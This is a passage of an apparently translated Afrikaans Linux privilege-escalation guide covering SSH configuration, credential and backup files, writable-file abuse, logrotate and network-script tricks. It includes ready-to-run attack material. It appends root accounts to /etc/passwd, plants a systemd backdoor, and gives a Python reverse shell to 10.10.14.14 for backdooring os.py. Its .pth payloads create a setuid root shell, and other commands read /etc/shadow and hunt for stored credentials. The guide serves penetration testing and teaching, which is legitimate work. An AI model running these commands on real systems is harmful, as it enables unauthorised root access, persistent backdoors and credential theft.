Sleutels wat gedurende die historiese kwesbare tydperk met geraakte Debian- of afgeleide OpenSSL-bouweergawes gegenereer is, kan voorspelbare ewekansigheid hê; die gasheer se huidige verspreiding of gelapte OpenSSL-weergawe bewys nie hoe ’n ouer sleutel gegenereer is nie. Kontroleer die **spesifieke sleutel** aan die hand van ’n geskikte historiese swartlys en sy herkoms. Debian se [`ssh-vulnkey`-handleiding](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) beskryf hoe om publieke sleutels en `authorized_keys` te kontroleer, en [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) teken die OpenSSL-regstelling aan. ’n Inskrywing in ’n bevoorregte rekening se `authorized_keys` is slegs ’n voorregte-eskalasie-aanwysing as die ooreenstemmende private sleutel herwin kan word en die effektiewe SSH-beleid daardie sleutel steeds vir daardie rekening aanvaar; ’n swak **host key** is nie op sigself ’n aanmeldbewys nie. Vervang gekompromitteerde sleutels en verwyder hul ou magtigings.

### Interessante SSH-konfigurasiewaardes

- **PasswordAuthentication:** Spesifiseer of wagwoordstawing toegelaat word. Die stroomop-verstekwaarde van OpenSSH is `yes`; die verspreidingskonfigurasie kan dit oorheers.
- **PubkeyAuthentication:** Spesifiseer of publieke-sleutel-stawing toegelaat word. Die verstekwaarde is `yes`.
- **PermitEmptyPasswords**: Wanneer wagwoordstawing toegelaat word, spesifiseer dit of die bediener aanmelding by rekeninge met leë wagwoordstringe toelaat. Die verstekwaarde is `no`.

### Aanmeldbeheer-lêers

Hierdie lêers beïnvloed wie kan aanmeld en hoe:

- **`/etc/nologin`**: indien dit bestaan, blokkeer dit aanmeldings van nie-root-gebruikers en vertoon dit sy boodskap.
- **`/etc/securetty`**: beperk waar root kan aanmeld (TTY-toelatingslys).
- **`/etc/motd`**: banier ná aanmelding (kan omgewings- of instandhoudingsbesonderhede uitlek).

### PermitRootLogin

Spesifiseer of root met ssh kan aanmeld. Die stroomop-verstekwaarde van OpenSSH is `prohibit-password`; die verspreidingskonfigurasie kan dit oorheers. Moontlike waardes:

- `yes`: root kan met ’n wagwoord en private sleutel aanmeld
- `without-password` of `prohibit-password`: root kan slegs met ’n private sleutel aanmeld
- `forced-commands-only`: Root kan slegs met ’n private sleutel aanmeld, en slegs as die opdragopsies gespesifiseer is
- `no` : nee

### Vertroude SSH-gebruikersertifikaatowerhede

`TrustedUserCAKeys` benoem publieke sleutels wat sshd vertrou om **gebruikers**-sertifikate te onderteken. As die ooreenstemmende private CA-sleutel deur ’n gebruiker met laer voorregte gelees kan word, ondersoek wie ’n sertifikaat kan kry en as watter rekening-principals dit kan staaf. `AuthorizedPrincipalsFile` of `AuthorizedPrincipalsCommand` kan aanvaarbare name beperk; as nie een gekonfigureer is nie, moet die sertifikaat die teikenrekening se naam bevat. `PermitRootLogin prohibit-password` blokkeer root-wagwoordstawing, maar kan steeds sertifikaatstawing toelaat. ’n Blootgestelde sleutelpad alleen bewys nie toegang nie: bevestig die publieke/private-sleutelpaar, effektiewe `Match`-reëls, rekeningbeleid, sleutelwagwoordfrase, herroeping en aanvaarbare handtekeningalgoritmes. Moenie private-sleutelgrepe in enumerasie-uitvoer insluit nie. Sien die [OpenSSH-bedienerkonfigurasiehandleiding](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

’n Private CA-sleutel kan ook bruikbaar wees **sonder dat dit vir die huidige gebruiker leesbaar is** indien ’n voorregdelegeringsreël daardie gebruiker toelaat om ’n onbeperkte [sertifikaatondertekenaar soos `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) onder die sleutel-eienaar se identiteit aan te roep. Vergelyk die presiese toegelate opdrag en argumente met die ondertekenaarrekening se toegang tot die sleutel, die publieke CA wat deur die effektiewe sshd-konfigurasie vertrou word, die principal wat vir die teikenrekening aanvaar word, sertifikaatgeldigheid en daardie rekening se aanmeldbeleid. ’n Gedelegeerde ondertekenaaropdrag of ’n vertroude CA-lêer alleen bewys nie toegang tot ’n ander rekening nie; moenie tydens passiewe enumerasie ’n toetssertifikaat onderteken nie.

### AuthorizedKeysFile

Spesifiseer lêers wat die publieke sleutels bevat wat vir gebruikersstawing gebruik kan word. Dit kan tekens soos `%h` bevat, wat deur die tuisgids vervang sal word. **Jy kan absolute paaie aandui** (wat met `/` begin) of **relatiewe paaie vanaf die gebruiker se tuisgids**. Byvoorbeeld:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Daardie konfigurasie dui aan dat wanneer jy met die **private** sleutel van die gebruiker "**testusername**" probeer aanmeld, ssh jou sleutel se publieke sleutel sal vergelyk met dié in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH-agentaanstuur laat jou toe om **jou plaaslike SSH-sleutels te gebruik in plaas daarvan om sleutels** (sonder wagwoordfrases!) op jou bediener te laat. Jy sal dus via ssh **na ’n gasheer kan spring** en van daar af **na ’n ander gasheer spring deur** die **sleutel** te gebruik wat op jou **aanvanklike gasheer** geleë is.

Jy moet hierdie opsie soos volg in `$HOME/.ssh.config` instel:

```
Host example.com
  ForwardAgent yes
```

Let daarop dat as `Host` elke keer `*` is wanneer die gebruiker na ’n ander masjien oorskakel, daardie gasheer toegang tot die sleutels sal hê (wat ’n sekuriteitsprobleem is).

Die lêer `/etc/ssh_config` kan hierdie opsies **ignoreer** en hierdie konfigurasie toelaat of verbied.\
Die lêer `/etc/sshd_config` kan ssh-agent-aanstuur toelaat of verbied met die sleutelwoord `AllowAgentForwarding` (die verstek is om dit toe te laat).

As jy vind dat Forward Agent in ’n omgewing opgestel is, lees die volgende bladsy, aangesien jy dit moontlik kan misbruik om voorregte te verhoog:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante lêers

### Profieellêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skrifte wat uitgevoer word wanneer ’n gebruiker ’n nuwe shell begin**. Daarom kan jy voorregte verhoog as jy enige daarvan **kan skryf of wysig**.

```bash
ls -l /etc/profile /etc/profile.d/
```

As enige vreemde profielscript gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd-/Shadow-lêers

Afhangend van die bedryfstelsel kan die `/etc/passwd`- en `/etc/shadow`-lêers ’n ander naam hê, of daar kan ’n rugsteun wees. Daarom word dit aanbeveel om **almal te vind** en **te kyk of jy hulle kan lees**, om te sien **of daar hashes in die lêers is**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

In sommige gevalle kan jy **password hashes** in die `/etc/passwd`-lêer (of ekwivalent) vind.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Skryfbare /etc/passwd

Genereer eers ’n wagwoord met een van die volgende opdragte.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Voeg dan die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su`-opdrag met `hacker:hacker` gebruik

Alternatiewelik kan jy die volgende reëls gebruik om ’n dummy-gebruiker sonder ’n wagwoord by te voeg.\
WAARSKUWING: jy kan die huidige sekuriteit van die masjien verswak.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

LET WEL: Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`; `/etc/shadow` word ook hernoem na `/etc/spwd.db`.

Jy moet kyk of jy **na sommige sensitiewe lêers kan skryf**. Kan jy byvoorbeeld na een of ander **dienskonfigurasielêer** skryf?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Byvoorbeeld, as die masjien ’n **tomcat**-bediener gebruik en jy **die Tomcat-dienskonfigurasielêer binne /etc/systemd/ kan wysig,** kan jy die reëls wysig:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Jou backdoor sal uitgevoer word die volgende keer dat tomcat begin word.

### Gaan vouers na

Die volgende vouers kan rugsteunkopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Jy sal waarskynlik nie die laaste een kan lees nie, maar probeer)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Vreemde liggings/lêers in jou besit

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Lêers wat die afgelope minute gewysig is

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite-databasislêers

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Vir leesbare toepassingsdatabasisse, ondersoek tabel- en kolomname vir gebruikersname en wagwoord-hashes. Om ’n hash te vind, die wagwoord daarvan te herwin en te bewys dat dit vir ’n plaaslike rekening hergebruik word, is afsonderlike stappe; ’n generiese heksadesimale string van 32 karakters is nie genoeg om af te lei dat dit MD5 is of dat daar toegang tot ’n rekening is nie.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

As ’n leesbare shell history ’n `sudo`-opdrag bevat wat deur ’n kort reël volg wat soos ’n wagwoord lyk, inspekteer die omliggende reëls handmatig. ’n Wagwoord wat by die gewone `sudo`-prompt ingevoer word, word nie in shell history gestoor nie; ’n daaropvolgende reël is bloot moontlik per ongeluk as shell-invoer ingetik, en is nie bewys van ’n geldige wagwoord nie. Die `.sudo_as_admin_successful`-merker teken vorige gebruik aan, nie huidige magtiging nie.

### Versteekte lêers

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skripte/binêre lêers in PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Weblêers**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Rugsteun**

Inspekteer leesbare lêers in rugsteungidse, asook lêers waarvan die **name** `backup` bevat: ’n argief met ’n ondeursigtige naam of ’n versleutelde lêeruitbreiding kan steeds ou toepassingdata blootstel. ’n Versleutelde argief is slegs ’n moontlike blootstelling. Wagwoordherwinning, inspeksie van die inhoud, herwinning van ’n toepassingshash en hergebruik van daardie wagwoord vir ’n Unix-rekening is afsonderlike stappe wat geverifieer moet word; ’n hash in ’n argief bewys nie dat daar ’n plaaslike aanmelding moontlik is nie.

Leesbare virtuelemasjien-rugsteun verdien dieselfde ondersoek. ’n VirtualBox `.vbox`-konfigurasie kan aangehegte `.vdi`-skyfbeelde identifiseer en metadata oor geënkripteerde skyfsleutels bevat; [VirtualBox dokumenteer dat die geënkripteerde datasleutel in die VM-konfigurasie gestoor word](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Beide die konfigurasie en die skyfbeeld moet toeganklik wees voordat ’n vanlyn skyfondersoek moontlik is. ’n Gasheervolume kan sy eie [LUKS-enkripsielaag](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) hê, wat ’n afsonderlike sleutel vereis. Selfs ná gemagtigde dekripsie kan ou skrifte of konfigurasies ’n wagwoord bevat; bepaal of die geloofsbriewe tans vir ’n gasheerrekening geldig is en of die rekening se effektiewe `sudo`-beleid ’n bevoorregte opdrag toelaat voordat dit ’n plaaslike eskalasie genoem word. Inventariseer paaie en toestemmings sonder om skyfbeelde tydens passiewe enumerasie te kopieer, te dekripteer of te koppel.

Wanneer jy ’n leesbare argief ondersoek, lys eers die lede se name voordat jy enigiets uitpak: versteekte verifikasielêers, materiaal met herstelkodes of SSH-sleutels kan teenwoordig wees, selfs al is die lewendige kopieë beskerm. Lêername dui slegs op ’n moontlike leidraad; verifieer die materiaal en enige hergebruik van rekeninge afsonderlik.

Prioritiseer **leesbare argiewe wat aan ’n ander gebruiker behoort** in rugsteungidse, veral argiewe wat aan root behoort en dié waartoe toegang deur groeplidmaatskap verkry kan word. ’n Ou argief kan ’n konfigurasie of verifikasiegeheim bevat, selfs wanneer die lewendige kopie beskerm is. Vir ’n plaaslike rugsteun-UI soos [Backrest](https://garethgeorge.github.io/backrest/), kyk na die diens se effektiewe rekening en of ’n gebruiker met minder voorregte die konfigurasie kan lees of by die UI kan aanmeld. Sy [hooks](https://garethgeorge.github.io/backrest/docs/hooks) en [restic-opdragkoppelvlak](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) kan met die daemon se lêer- en opdragvoorregte werk; ’n loopback-luisteraar alleen bepaal nie die impak nie. Backrest se `passwordBcrypt` is ’n base64-geënkodeerde bcrypt-hash in sy [verifikasiekode](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), nie ’n gewone tekswagwoord nie. Bevestig die diensidentiteit, bruikbare geloofsbriewe en toegang tot die betrokke plan of bewaarplek voordat jy ’n blootgestelde argief of UI as ’n voorreggrens beskou.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog 'n interessante tool** wat jy hiervoor kan gebruik, is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), 'n oopbrontoepassing wat gebruik word om baie wagwoorde te herwin wat op 'n plaaslike rekenaar vir Windows, Linux en Mac gestoor is.

As `/etc/guacamole/guacamole.properties` leesbaar is, hersien die `mysql-*`-, `postgresql-*`- of `sqlserver-*`-databasisverbindinginstellings. As die rekening gemagtig is om die Guacamole JDBC-tabelle te lees, kan `guacamole_connection_parameter` gestoorde SSH-waardes vir `username`, `password`, `private-key` of `passphrase` bevat. Begin met die verbindings-ID's en parametername, en ondersoek dan slegs relevante rye; 'n gestoorde waarde kan 'n dinamiese token of 'n vault-verwysing wees, eerder as 'n herbruikbare geheim. Sien die [Guacamole JDBC-skema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) en [SSH-verbindingsparameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Die [pswm-wagwoordbestuurder](https://github.com/Julynx/pswm#usage) stoor by verstek 'n geënkripteerde vault by `~/.local/share/pswm/pswm`. As 'n ander gebruiker se vault sigbaar is, kyk wie dit besit en of jou rekening dit werklik kan lees. Die vault-pad alleen verklap nie aanmeldbesonderhede nie; om die hoofwagwoord te herwin, 'n herbruikbare rekeningwagwoord te vind en daardie rekening se voorregte te bevestig, is afsonderlike stappe.

[Passpie se verstekdatabasis](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) is `~/.passpie/`, met 'n `.keys`-sleutelring en geënkripteerde `.pass`-aanmeldbesonderheidlêers in groepgidse. 'n Sigbare databasisgids is net 'n leidraad na 'n pad: bevestig toegang tot die sleutel en die relevante geënkripteerde inskrywing, enige vereiste hoofwagwoordfrase, en of 'n herwonne aanmeldbesonderheid aan 'n rekening met meer voorregte behoort. Passpie ondersteun ook [pasgemaakte databasispaadjies](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), dus is die verstekpad nie volledig nie. Outomatiese enumerasie behoort metadata te lys sonder om aanmeldbesonderhede uit te voer of sleutelmateriaal te vertoon.

### Logboeke

As jy logboeke kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die logboek is, hoe interessanter sal dit waarskynlik wees.\
Ook kan sommige sleg gekonfigureerde (moontlik met 'n backdoor?) **ouditlogboeke** jou dalk toelaat om **wagwoorde in ouditlogboeke aan te teken**, soos in hierdie plasing verduidelik word: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Om logs te kan lees, sal die groep [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generiese Creds-soektog/Regex

Jy moet ook kyk vir lêers wat die woord "**password**" in hul **naam** of in die **inhoud** bevat, en ook vir IP's en e-posadresse in logs, of vir hash-regexps.\
Ek gaan nie hier lys hoe om dit alles te doen nie, maar as jy belangstel, kan jy kyk na die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer.

## Skryfbare lêers

### Python library hijacking

As jy weet **waarvandaan** 'n Python-skrip uitgevoer gaan word en jy **in daardie vouer kan skryf** of **Python-biblioteke kan wysig**, kan jy die OS-biblioteek wysig en dit backdoor (as jy kan skryf in die vouer waar die Python-skrip uitgevoer gaan word, kopieer en plak die os.py-biblioteek).

Om die **biblioteek te backdoor**, voeg net die volgende reël aan die einde van die os.py-biblioteek by (verander die IP en PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Writable `.pth` processed by `site.addsitedir()`

Moenie `site.addsitedir(DIR)` as gelykstaande aan `sys.path.append(DIR)` beskou nie. Dit verwerk ook elke `*.pth`-lêer in `DIR`. ’n Reël wat met `import` gevolg deur ’n spasie of tab begin, word as Python-kode uitgevoer. Padreëls word daarenteen relatief tot die site-gids opgelos en slegs bygevoeg wanneer hulle bestaan.<sup>[[38]](#references)</sup>

Dit lei tot privilege escalation wanneer ’n sudo-toegelate of andersins bevoorregte Python-program `site.addsitedir()` aanroep op ’n gids wat skryfbaar is vir die huidige gebruiker of een van hul groepe. Die `.pth`-kode loop terwyl die bevoorregte program sy invoerpad opstel, voordat sy normale handeling uitgevoer word.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Uitvoerbare `.pth`-inhoud moet op een reël pas, maar kommapunte laat verskeie stellings toe. Byvoorbeeld, ’n root-uitvoeringspad kan ’n setuid Bash-kopie skep; roep Bash met `-p` aan sodat dit sy effektiewe ID behou.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Die `-S`-opsie deaktiveer slegs Python se outomatiese `site`-inisialisering. Dit beskerm nie ’n program wat `site` uitdruklik invoer en `site.addsitedir()` aanroep nie. Verwyder gidse wat deur aanvallers geskryf kan word uit bevoorregte invoerpaaie en vereis dat die gids en sy `.pth`-lêers slegs deur die bevoorregte administrateur besit en geskryf kan word.<sup>[[38]](#references)[[39]](#references)</sup>

### Uitbuiting van logrotate

’n Bevoorregte `logrotate`-taak kan ’n lêerskryfpad tussen gebruikers skep wanneer dit werklik ’n log roteer wat onder ’n gids lê wat ’n gebruiker met minder voorregte tydens die rotasie kan vervang of herlei. ’n Skryfbare log is op sigself net ’n leidraad. Bevestig die presiese aktiewe reël en sy `create`-, `olddir`- en `su`-instruksies; die skeduleerder se effektiewe identiteit; skryf- en soekregte op die log se ouergids; en of die geïnstalleerde bouweergawe en beleid die bestemmingsverandering toelaat. ’n Latere bevoorregte shell moet ook die resulterende lêer laai sodat ’n skryfbewerking na ’n opstartlêer tot kode-uitvoering lei. Inspekteer die skedule, reël, weergawe/verpakking en padmetadata sonder om ’n rotasie te veroorsaak of die wedloop te probeer.

> [!TIP]
> Moenie `3.18.0` of enige weergawe-string alleen as ’n grens vir uitbuitbaarheid beskou nie. [Upstream se veranderingslogboek](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) teken gids- en simboliese-skakelverharding in verskeie vrystellings aan, en verspreidings kan regstellings terugporteer. Die [upstream-handleiding](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) beveel `su` aan wanneer root logs roteer in gidse wat deur gebruikers sonder bevoorregte toegang beheer word; verifieer die effektiewe reël en werklike gedrag.

Meer inligting oor die kwesbaarheid is op hierdie bladsy beskikbaar: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Jy kan hierdie kwesbaarheid met [**logrotten**](https://github.com/whotwagner/logrotten) uitbuit.

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-logs),** so wanneer jy ontdek dat jy logs kan verander, kyk wie hulle bestuur en of jy voorregte kan eskaleer deur die logs met simboliese skakels te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Verwysing na kwesbaarheid:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

’n `ifcfg-*`-lêer is ’n leidraad om te ondersoek wanneer ’n gebruiker met minder voorregte dit kan skep of verander **en** ’n bevoorregte netwerkaktiveringspad daardie presiese lêer sal lees. Bevestig die effektiewe lêer- en gidstoestemmings, die gekose koppelvlak, die geïnstalleerde `ifup`/`ifdown`-implementering en wie dit aanroep. ’n Skryfbare lêer veroorsaak nie op sy eie kode-uitvoering nie. [Red Hat se RHEL 7-netwerkgids](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) onderskei verouderde netwerkskrifte van NetworkManager: laasgenoemde aktiveer nie op sy eie eersgenoemde nie. [RHEL 8-dokumentasie](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) meld dat sy verstek-`ifup`/`ifdown` NetworkManager gebruik, terwyl die opsionele verouderde pakket shell-skrifte verskaf.

Op ’n stelsel wat werklik bevoorregte verouderde skripte gebruik, kan ’n ongekwoteerde, deur die shell-gelaaide `ifcfg-*`-toewysing soos `NAME=` ’n grens vir kode-uitvoering oorsteek. Verifieer die presiese ontleder, waarde en aktiveringspad; moenie shell-interpretasie aflei uit die lêernaam of die teenwoordigheid van NetworkManager nie. ’n `sudo`-toegelate omhulsel wat invoer van die oproeper na ’n `ifcfg-*`-lêer skryf en dan verouderde `ifup` aanroep, is ’n afsonderlike roete oor hierdie grens, selfs wanneer die oproeper nie die lêer direk kan wysig nie.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Let op die spasie tussen Network en /bin/id_)

### **init, init.d, systemd en rc.d**

Die gids `/etc/init.d` bevat **skrifte** vir System V init (SysVinit), die **klassieke Linux-diensbestuurstelsel**. Dit sluit skrifte in om dienste te `start`, `stop`, `restart` en soms te `reload`. Dit kan direk uitgevoer word of deur simboliese skakels in `/etc/rc?.d/`. ’n Alternatiewe pad op Redhat-stelsels is `/etc/rc.d/init.d`.

Daarteenoor word `/etc/init` met **Upstart** verbind, ’n nuwer **diensbestuurstelsel** wat deur Ubuntu bekendgestel is en konfigurasielêers vir diensbestuurstake gebruik. Ondanks die oorgang na Upstart word SysVinit-skrifte steeds saam met Upstart-konfigurasies gebruik danksy ’n versoenbaarheidslaag in Upstart.

**systemd** is ’n moderne inisialiserings- en diensbestuurder wat gevorderde kenmerke bied, soos die begin van daemone op aanvraag, outomount-bestuur en momentopnames van stelseltoestande. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakkette en `/etc/systemd/system/` vir administrateurwysigings, wat die stelseladministrasieproses vereenvoudig.<sup>[[21]](#references)</sup>

## Ander truuks

### NFS-voorregte-eskalering


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnap uit beperkte Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android-rootingraamwerke: misbruik van manager-kanale

Android-rootingraamwerke haak gewoonlik ’n syscall om bevoorregte kernelfunksionaliteit aan ’n userspace-manager beskikbaar te stel. Swak manager-verifikasie (bv. handtekeningkontroles wat op FD-volgorde gebaseer is, of swak wagwoordskemas) kan ’n plaaslike toepassing in staat stel om die manager na te boots en root-toegang op toestelle wat reeds geroot is, te verkry. Kom hier meer te wete en lees oor die uitbuitingsbesonderhede:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools-diensontdekking-LPE (CWE-426) via regex-gebaseerde exec (CVE-2025-41244)

Regex-gedrewe diensontdekking in VMware Tools/Aria Operations kan ’n binêre pad uit prosesopdragreëls haal en dit met -v in ’n bevoorregte konteks uitvoer. Toegeeflike patrone (bv. dié wat \S gebruik) kan luisterdienste wat ’n aanvaller in skryfbare plekke (bv. /tmp/httpd) geplaas het, pas; dit kan lei tot uitvoering as root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Kom hier meer te wete en sien ’n algemene patroon wat op ander ontdekking-/moniteringstapels van toepassing is:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel-sekuriteitsbeskerming

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Statiese impacket-binêre lêers](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix-Privesc-nutsmiddels

### **Beste nutsmiddel om Linux-plaaslike voorregte-eskalasievektore te vind:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t-opsie)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
